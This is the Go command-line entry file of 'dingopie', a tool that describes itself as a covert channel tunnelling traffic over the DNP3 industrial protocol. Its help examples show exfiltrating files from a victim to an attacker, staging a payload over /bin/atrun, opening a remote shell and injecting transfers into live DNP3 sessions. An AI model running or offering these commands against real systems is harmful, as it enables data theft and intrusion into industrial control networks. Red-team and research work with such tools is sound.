// Package cmd implements dingopie cli with cobra
package cmd

import (
	"errors"
	"fmt"
	"io"
	"os"
	"slices"
	"strings"
	"time"

	"github.com/nblair2/dingopie/internal"
	"github.com/nblair2/dingopie/internal/inject"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

// Cobra command group IDs.
const (
	groupRole   = "role"
	groupMode   = "mode"
	groupAction = "action"

	titleRole   = "Roles:"
	titleMode   = "Modes:"
	titleAction = "Actions:"

	useSend    = "send"
	useRecv    = "receive"
	useShell   = "shell"
	useConnect = "connect"
)

// Flag defaults.
const (
	defaultServerPort    = 20000
	defaultPoints        = 8
	defaultPointVariance = 0.25
	receiveFileMode      = 0o400
)

// ==================================================================
// Flag Vars
// ==================================================================

var (
	serverIP   string
	serverPort int
	key        string

	// direct send/receive.
	wait          time.Duration
	file          string
	points        int
	pointVariance float32

	// shell.
	command string

	// inject.
	clientIP   string
	clientPort int
)

// ==================================================================
// Helper Functions
// ==================================================================

func getData(cmd *cobra.Command, file string, args []string) ([]byte, error) {
	if file != "" {
		//nolint: gosec // G304 opening file provided by user
		b, err := os.ReadFile(file)
		if err != nil {
			return nil, fmt.Errorf("error reading file: %w", err)
		}

		return b, nil
	}

	fi, err := os.Stdin.Stat()
	if err != nil {
		return nil, fmt.Errorf("error checking stdin: %w", err)
	}

	if (fi.Mode() & os.ModeCharDevice) == 0 {
		b, err := io.ReadAll(os.Stdin)
		if err != nil {
			return nil, fmt.Errorf("error reading stdin: %w", err)
		}

		if len(b) == 0 {
			return nil, errors.New("no data provided to send (stdin empty)")
		}

		cmd.Printf(">> Message read from stdin\n")

		return b, nil
	}

	if len(args) == 1 {
		data := []byte(args[0])

		cmd.Printf(">> Message read from command line\n")

		return data, nil
	} else if len(args) > 1 {
		return nil, errors.New("too many arguments provided")
	}

	return nil, errors.New("no data provided to send")
}

// openOutFile opens the file flag path for exclusive writing.
// Returns nil when no --file flag was given.
func openOutFile(cmd *cobra.Command) *os.File {
	if file == "" {
		return nil
	}

	f, err := os.OpenFile( //nolint:gosec
		file, os.O_WRONLY|os.O_CREATE|os.O_EXCL, receiveFileMode,
	)
	if err != nil {
		cmd.Printf("Error opening file %s: %v\n", file, err)
		os.Exit(1)
	}

	return f
}

// writeOut writes data to f and closes it, or prints it to stdout when f is nil.
func writeOut(cmd *cobra.Command, f *os.File, data []byte) {
	if f == nil {
		cmd.Printf(">> Message: %s\n", string(data))

		return
	}

	_, writeErr := f.Write(data)

	f.Close()

	if writeErr != nil {
		cmd.Printf("Error writing to file: %v\n", writeErr)
		cmd.Printf(">> Data received: %s\n", string(data))
		os.Exit(1)
	}

	cmd.Printf(">> Data written to %s\n", file)
}

// ==================================================================
// User Interface
// ==================================================================
// Two commands to help standardized UI output for all action commands.
var mustDisplayFlag = []string{"server-port", "points", "point-variance", "wait", "command"}

func printCommand(cmd *cobra.Command) {
	cmd.Println(
		strings.ReplaceAll(
			fmt.Sprintf("============= %s =============", cmd.CommandPath()),
			" ",
			" | ",
		),
	)
}

func dumpFlags(cmd *cobra.Command) {
	cmd.Println(">> Flags:")
	cmd.Flags().VisitAll(func(f *pflag.Flag) {
		if !f.Changed && !slices.Contains(mustDisplayFlag, f.Name) {
			return
		}

		cmd.Printf("\t% 14s:\t%s\n", f.Name, f.Value)
	})
}

func preRun(cmd *cobra.Command) {
	printCommand(cmd)
	dumpFlags(cmd)
}

func postRun(cmd *cobra.Command) {
	cmd.Printf(">> KTHXBI\n")
	printCommand(cmd)
}

// ==================================================================
// Inject
// ==================================================================

func runInjectSend(
	cmd *cobra.Command,
	args []string,
	localAddr, remoteAddr string,
	localPort, remotePort int,
) {
	data, err := getData(cmd, file, args)
	if err != nil {
		cmd.Printf("Error getting data: %v\n", err)
		os.Exit(1)
	}

	err = inject.Send(cmd.OutOrStdout(), localAddr, remoteAddr, localPort, remotePort, key, data)
	if err != nil {
		cmd.Printf("Error with inject send: %v\n", err)
		os.Exit(1)
	}
}

func runInjectReceive(cmd *cobra.Command, localAddr, remoteAddr string, localPort, remotePort int) {
	f := openOutFile(cmd)

	data, err := inject.Receive(
		cmd.OutOrStdout(), localAddr, remoteAddr, localPort, remotePort, key,
	)
	if err != nil {
		cmd.Printf("Error with inject receive: %v\nAttempting to output what data we have\n", err)
	}

	writeOut(cmd, f, data)
}

// ==================================================================
// Root
// ==================================================================

var rootCmd = &cobra.Command{
	Use:   "dingopie <role> <mode> <action>",
	Short: "dingopie is a DNP3 covert channel",
	Long: internal.Banner + `dingopie is a tool for tunneling traffic over DNP3. There are two main
functions: transferring files ('send' | 'receive'), and establishing
an interactive shell ('shell' | 'connect').
`,
	Example: `  Exfiltrate a file:
    # on victim
    $ dingopie server direct send --file black-box --key "my voice is my passport"
    # on attacker or intermediary
    $ dingopie client direct receive --file loot/janeks-box --key "my voice is my passport" --server-ip 10.1.2.3

  Stage a payload:
    # on victim
    $ dingopie server direct receive --file /bin/atrun --server-port 20001
    # on attacker
    $ dingopie client direct send --file payloads/egg --server-ip 128.3.6.22 --server-port 20001
  
  Tunnel a shell over DNP3:
    # on victim
    $ dingopie server direct shell
    # on attacker
    $ dingopie.exe client direct connect -i 131.43.110.7
    dingopie>
		
  Transfer a file over an existing DNP3 connection:
    # on victim
    $ dingopie server inject send -f /tmp/garbage.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
    # on attacker or intermediary
    $ dingopie client inject receive -f ~/da-vinci-source.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
`,
	PersistentPreRun: func(cmd *cobra.Command, _ []string) {
		preRun(cmd)
	},
	PersistentPostRun: func(cmd *cobra.Command, _ []string) {
		postRun(cmd)
	},
}

// Execute - dingopie.
func Execute() {
	rootCmd.SetOut(os.Stdout)

	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	rootCmd.AddGroup(&cobra.Group{ID: groupRole, Title: titleRole})
	rootCmd.AddCommand(clientCmd, serverCmd)
	rootCmd.PersistentFlags().
		StringVarP(&key, "key", "k", "Setec Astronomy", "encryption key to garble data")
	rootCmd.PersistentFlags().StringVarP(&serverIP, "server-ip", "i", "", "server IP address")
	rootCmd.PersistentFlags().
		IntVarP(&serverPort, "server-port", "p", defaultServerPort, "server port")
	// A custom usage template is the least of all evils that I have found to allow the unique structure
	// of requiring role, mode, and action in the command line, while still providing clear help messages.
	//nolint: lll // template
	rootCmd.SetUsageTemplate(`Usage:
  {{.UseLine}}
{{if .HasAvailableSubCommands}}{{range $group := .Groups}}
{{$group.Title}}{{range $cmd := $.Commands}}{{if (and (eq $cmd.GroupID $group.ID) (or $cmd.IsAvailableCommand (eq $cmd.Name "help")))}}
  {{rpad $cmd.Name $cmd.NamePadding }} {{$cmd.Short}}{{end}}{{end}}{{end}}{{end}}

{{if .HasAvailableLocalFlags}}Flags:
{{.LocalFlags.FlagUsages | trimTrailingWhitespaces}}{{end}}

{{if .HasAvailableInheritedFlags}}Global Flags:
{{.InheritedFlags.FlagUsages | trimTrailingWhitespaces}}{{end}}{{if .HasExample}}Examples:
{{.Example}}{{end}}
`)
}
